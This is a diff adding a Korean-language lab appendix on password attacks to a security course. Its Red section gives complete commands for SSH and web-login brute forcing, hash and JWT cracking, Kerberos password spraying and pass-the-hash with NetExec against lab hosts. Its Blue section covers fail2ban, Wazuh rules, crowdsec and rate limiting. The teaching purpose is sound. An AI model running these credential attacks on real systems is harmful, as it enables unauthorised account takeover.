@@ -701,3 +701,212 @@ graph LR
 
 **학생 액션**: hydra 로 SSH 시도 → Wazuh 4625 룰 적중.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 04 패스워드 공격)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 | 명령 |
+|------|----------|---------|------|
+| s1 | hydra SSH | hydra | `hydra -L u.txt -P p.txt ssh://10.20.30.80` |
+| s2 | medusa 비교 | medusa | `medusa -h target -U u.txt -P p.txt -M ssh` |
+| s3 | john MD5 | john | `john --format=raw-md5 hash.txt --wordlist=rockyou.txt` |
+| s4 | hashcat GPU | hashcat | `hashcat -m 0 -a 0 hash.txt rockyou.txt` |
+| s5 | hashid 식별 | hashid | `hashid '5f4dcc...'` |
+| s6 | jwt_tool | jwt_tool | `jwt_tool $TOKEN -T -C -d rockyou.txt` |
+| s7 | kerbrute (AD) | kerbrute | `kerbrute userenum -d corp.local users.txt` |
+| s8 | NetExec (modern CME) | nxc | `nxc smb 10.0.0.0/24 -u u -p p` |
+
+### 학생 환경 준비
+
+```bash
+# 도구 설치
+sudo apt install -y hydra medusa ncrack patator \
+    john hashcat hashid \
+    rockyou-wordlist
+
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
+ls -la /usr/share/wordlists/
+
+# kerbrute (AD 환경)
+go install github.com/ropnop/kerbrute@latest
+
+# NetExec (modern CrackMapExec 후속)
+pipx install git+https://github.com/Pennyw0rth/NetExec
+
+# Impacket suite
+pip install impacket
+
+# Hashcat GPU (NVIDIA + CUDA)
+sudo apt install -y nvidia-cuda-toolkit
+```
+
+### Red — 인증 brute 종합
+
+```bash
+# === Phase 1: SSH brute ===
+# Hydra (50+ 프로토콜, 가장 표준)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    ssh://10.20.30.80 -t 4 -V -e nsr
+
+# Medusa (대안)
+medusa -h 10.20.30.80 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
+
+# Patator (Python, 유연)
+patator ssh_login host=10.20.30.80 user=admin password=FILE0 0=rockyou.txt
+
+# ncrack (multi-protocol)
+ncrack -u admin -P /usr/share/wordlists/rockyou.txt 10.20.30.80:22
+
+# === Phase 2: HTTP-form brute (web login) ===
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \
+    10.20.30.80 -s 3000 \
+    http-post-form '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:invalid' \
+    -t 4 -V
+
+# Burp Intruder 대안 — ffuf
+ffuf -w /usr/share/wordlists/rockyou.txt \
+    -X POST -u http://10.20.30.80:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
+    -mc all -fs 50 -t 4
+
+# === Phase 3: Hash 크랙 ===
+# Hash 식별
+hashid '5f4dcc3b5aa765d61d8327deb882cf99'
+# → MD5 (raw-md5)
+
+# John (CPU 표준)
+echo 'admin:5f4dcc3b5aa765d61d8327deb882cf99' > /tmp/hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
+john --show /tmp/hash.txt
+
+# Hashcat (GPU 가속, 매우 빠름)
+hashcat -m 0 -a 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 0 -a 3 /tmp/hash.txt '?l?l?l?l?d?d?d?d'    # mask attack
+hashcat --show /tmp/hash.txt
+
+# Hash mode 참고:
+# 0    MD5
+# 100  SHA-1
+# 1400 SHA-256
+# 1700 SHA-512
+# 1000 NTLM
+# 22000 WPA-PBKDF2 (week13)
+# 16500 JWT HS256
+
+# === Phase 4: JWT 공격 (week03 재사용) ===
+TOKEN=$(curl -s ... | jq -r .authentication.token)
+
+# Auto 약점
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -T
+
+# Secret brute
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -C \
+    -d /usr/share/wordlists/rockyou.txt
+
+# 또는 hashcat (HS256)
+echo "$TOKEN" > /tmp/jwt.txt
+hashcat -m 16500 -a 0 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
+
+# === Phase 5: AD 환경 (kerbrute) ===
+kerbrute userenum -d corp.local --dc 10.0.0.1 users.txt
+kerbrute passwordspray -d corp.local --dc 10.0.0.1 users.txt 'Spring2026!'
+kerbrute bruteuser -d corp.local --dc 10.0.0.1 /usr/share/wordlists/rockyou.txt admin
+
+# === Phase 6: 다중 호스트 lateral (NetExec) ===
+nxc smb 10.0.0.0/24 -u admin -p Pa$$w0rd
+nxc smb 10.0.0.0/24 -u admin -H "ntlm-hash"          # PtH
+nxc winrm 10.0.0.5 -u admin -H "ntlm-hash"            # PtH winrm
+```
+
+### Blue — 인증 방어
+
+```bash
+# === fail2ban (SSH brute 자동 차단) ===
+sudo apt install -y fail2ban
+sudo cat > /etc/fail2ban/jail.d/sshd.conf << 'EOF'
+[sshd]
+enabled = true
+maxretry = 3
+findtime = 600
+bantime = 3600
+banaction = nftables-multiport
+EOF
+sudo systemctl restart fail2ban
+sudo fail2ban-client status sshd
+
+# === Wazuh frequency rule ===
+sudo tee -a /var/ossec/etc/rules/local_rules.xml << 'EOF'
+<rule id="100400" level="14" frequency="5" timeframe="120">
+  <if_matched_sid>5710</if_matched_sid>
+  <description>SSH brute force (5+ failed auths in 2min)</description>
+  <mitre><id>T1110.001</id></mitre>
+</rule>
+
+<rule id="100401" level="13" frequency="10" timeframe="60">
+  <if_matched_sid>31100</if_matched_sid>
+  <description>HTTP login brute (10+ in 60s)</description>
+  <mitre><id>T1110.001</id></mitre>
+</rule>
+EOF
+
+# === crowdsec community 룰셋 ===
+sudo cscli scenarios install crowdsecurity/ssh-bf \
+    crowdsecurity/http-bf-wordpress_bf \
+    crowdsecurity/http-generic-bf
+
+# === Web 측 — rate limit ===
+# nginx limit_req
+# /etc/nginx/sites-enabled/...
+# limit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;
+# location /rest/user/login { limit_req zone=login burst=10 nodelay; }
+
+# === MFA / hardening ===
+# /etc/ssh/sshd_config
+# PermitRootLogin no
+# PasswordAuthentication no                              # SSH key only
+# MaxAuthTries 3
+# ClientAliveInterval 300
+sudo systemctl restart ssh
+```
+
+### 결과 분석
+
+```bash
+# === Red 결과 분석 ===
+# Hydra 결과 → 발견된 자격증명
+grep "host:" /root/hydra.restore | head
+
+# John --show
+john --show /tmp/hash.txt
+# admin:password
+# user1:Spring2024
+# 2 password hashes cracked, 0 left
+
+# === Blue 분석 ===
+# Wazuh 에서 brute force 분포
+sudo jq -r 'select(.rule.id == "100400") | "\(.timestamp) \(.data.srcip) \(.data.dstuser)"' \
+    /var/ossec/logs/alerts/alerts.json | sort | uniq -c | sort -rn | head -10
+
+# fail2ban 차단 현황
+sudo fail2ban-client status sshd | grep "Banned IP"
+
+# nft set
+ssh ccc@10.20.30.1 "sudo nft list set inet filter blocked"
+```
+
+### 권장 최소 비밀번호 정책 (Blue)
+
+| 정책 | 값 |
+|------|-----|
+| 최소 길이 | 12자 (NIST 800-63b) |
+| 복잡도 | 대문자 + 소문자 + 숫자 + 특수문자 |
+| Rotation | 90일 (legacy) 또는 변경 안 함 (modern) |
+| 금지어 | rockyou top 1000, 회사명, 사용자명 |
+| Lockout | 5회 실패 → 15분 |
+| MFA | 모든 admin 계정 강제 |
+
+학생은 본 4주차에서 **Red (hydra + medusa + john + hashcat + jwt_tool + kerbrute + nxc) ↔ Blue (fail2ban + Wazuh frequency + crowdsec + nginx rate-limit + SSH key)** 의 인증 공방을 OSS 도구로 익힌다.
